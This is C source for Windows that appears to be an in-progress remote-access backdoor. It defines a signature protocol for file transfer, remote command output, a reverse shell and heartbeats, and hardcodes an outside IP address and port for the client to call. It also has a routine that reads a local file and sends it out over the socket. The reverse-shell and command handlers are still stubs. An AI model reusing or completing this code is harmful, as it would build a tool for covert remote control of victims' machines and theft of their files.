#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_PORT "27015"

const char _SIG_INIT[] = {0xfb, 0x00};
const char _SIG_FILE[] = {0xfb, 0x01};
const char _SIG_COUT[] = {0xfb, 0x02};
const char _SIG_SHLL[] = {0xfb, 0x03};
const char _SIG_HRBT[] = {0xff, 0xff};

int MatchSig(char buf[2])
{
    if (buf[0] == (char)0xfb || buf[0] == (char)0xff){
        return buf[1];
    }
    return -1;
}

int WinsockInitialized(void)
{
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET){
        return 0;
    }
    closesocket(s);
    return 1;
}

int InitSetup(void)
{
    WSADATA wsaData;
    int iResult;
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return -6;
    }
    return 0;
}

int IpSetupINIT(struct addrinfo** result){
    struct addrinfo hints;
    int iResult;
    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("45.143.93.119", DEFAULT_PORT, &hints, result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        return -5;
    }
    return 0;
}

int ConnectINIT(SOCKET* ConnectSocket, struct addrinfo* result){
    int iResult;
    struct addrinfo* ptr = NULL;
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        *ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (*ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %d\n", WSAGetLastError());
            freeaddrinfo(result);
            return -1;
        }

        // Connect to server.
        iResult = connect( *ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(*ConnectSocket);
            *ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);

    if (*ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        return -1;
    }
    return 0;
}
//  GIT COMMIT TEST
int SetupServer(struct addrinfo **result){
    int iResult;
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return -1;
    }
    return 0;
}

int TransferFile(char* path, SOCKET ConnectSocket)
{
    int iResult;


    FILE* fd;
    fopen_s(&fd, path,"r");
    if (fd == NULL) {
        printf("Unable to open file!\n");
        closesocket(ConnectSocket);
        return -7;
    }
    fseek(fd, 0, SEEK_END);
    int nsz = ftell(fd);
    u_long sz = htonl((u_long)nsz);
    fseek(fd, 0, SEEK_SET);
    iResult = send( ConnectSocket, (char*)&sz, 4, 0 );
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        return -2;
    }
    char* buf = (char*)malloc(sz*sizeof(char));
    if(!buf){
        closesocket(ConnectSocket);
        return -3;
    }
    fread(buf, 1, nsz, fd);

    iResult = send( ConnectSocket, buf, nsz, 0 );
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        free(buf);
        return -2;
    }
    free(buf);
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        return -4;
    }
    // cleanup
    closesocket(ConnectSocket);

    return 0;
}

int waitForData(SOCKET s) {
    // Create a set of file descriptors to be monitored for read events
    int iResult;
    fd_set readfds;

    // Determine the maximum file descriptor number to be included in the set
    int max_fd = _fileno(stdin) + 1;

    // Clear the readfds set and add the socket and stdin file descriptors to it
    FD_ZERO(&readfds);
    FD_SET(_fileno(stdin), &readfds);
    FD_SET(s, &readfds);

    // Set a timeout period of 30 seconds using a struct timeval
    struct timeval tv;
    tv.tv_sec = 45;
    tv.tv_usec = 0;

    // Wait for a read event on any of the file descriptors using select()
    int ret = select(max_fd, &readfds, NULL, NULL, &tv);
    if (ret < 0) {
        perror("select Failed");
        return -1;
    }

    // Check if the socket file descriptor is in the set of file descriptors that have data available
    if (FD_ISSET(s, &readfds)) {
        char buf[2] = {0};
        iResult = recv(s, (char*)&buf, 2, 0);
        if (iResult < 0){
            perror("recv Failed");
            return -1;
        }
        int sig = MatchSig(buf);
        if (sig < 0){
            perror("sig invalid");
        }
        return sig;

    } else {
        return -1;
    }
}

int HeartBeat(SOCKET s){
    int iResult;
    iResult = send(s, _SIG_HRBT, 2, 0);
    printf("Sent heartbeat\n");
    return iResult;
}

short SocketCreate(void)
{
    short hSocket;
    printf("Create the socket\n");
    hSocket = socket(AF_INET, SOCK_STREAM, 0);
    return hSocket;
}
int BindCreatedSocket(int hSocket)
{
    int iRetval;
    int ClientPort = atoi(DEFAULT_PORT);
    struct sockaddr_in  remote= {0};
    remote.sin_family = AF_INET;
    remote.sin_addr.s_addr = htonl(INADDR_ANY);
    remote.sin_port = htons(ClientPort); /* Local port */
    iRetval = bind(hSocket,(struct sockaddr *)&remote,sizeof(remote));
    return iRetval;
}



int __cdecl main(int argc, char **argv)
{
    int iResult, sig;
    struct addrinfo *result = NULL;
    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET sock = INVALID_SOCKET;
    if (!WinsockInitialized()){
        iResult = InitSetup();
        if (iResult < 0){
            return iResult;
        }
    }
    iResult = SetupServer(&result);
    if (iResult < 0){
        perror("server setup fail");
        return 1;
    }
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }
    iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }
    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    /* Start a thread for heartbeating [IpSetup, Connect, HeartBeat, Close]*/
    while (1){
        // MAIN EVENT LOOP
        eventloop:
        char buf[2] = {0};
        printf("Listening\n");
        sock = accept(ListenSocket, NULL, NULL);
        printf("Connected\n");
        if (sock == INVALID_SOCKET) {
            printf("accept failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }
        if (sock < 0)
        {
            perror("accept failed");
            goto eventloop;
        }
        iResult = recv(sock, (char*)&buf, 2, 0);
        if (iResult != 2){
            perror("Incorrect signature recieved dropping connection");
            closesocket(sock);
            goto eventloop;
        }
        sig = MatchSig(buf);
        if (sig < 0){
            perror("Invalid signature dropping connection");
            closesocket(sock);
            goto eventloop;
        }
        switch (sig){
            case 0x0:
                printf("Got 0\n");
            /* INITIALIZE and should not be handled on client side*/
                break;
            case 0x1:
                printf("Got 1\n");
            /* File transfer, presumably uploading to client */
                break;
            case 0x2:
                printf("Got 2\n");
            /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
                break;
            case 0x3:
                printf("Got 3\n");
            /* Reverse shell */
                break;
            case 0xff:
                printf("Got ff\n");
            /* Heartbeat */
                break;
        }
        closesocket(sock);

    }

    WSACleanup();
    return 0;

}

/* real CLIENT ALIKE LOGIC to set up in win
SOCKET ConnectSocket = INVALID_SOCKET;
    int iResult;
    struct addrinfo *result = NULL;
    if (!WinsockInitialized()){
        iResult = InitSetup();
        if (iResult < 0){
            return iResult;
        }
    }

    iResult = IpSetup(&result);
    if (iResult < 0){
        return iResult;
    }
    iResult = Connect(&ConnectSocket, result);
    if(iResult < 0){
        return iResult;
    }
    while (1){

    }
    WSACleanup();
    closesocket(ConnectSocket);

*/

// DONT FORGET WSACleanup();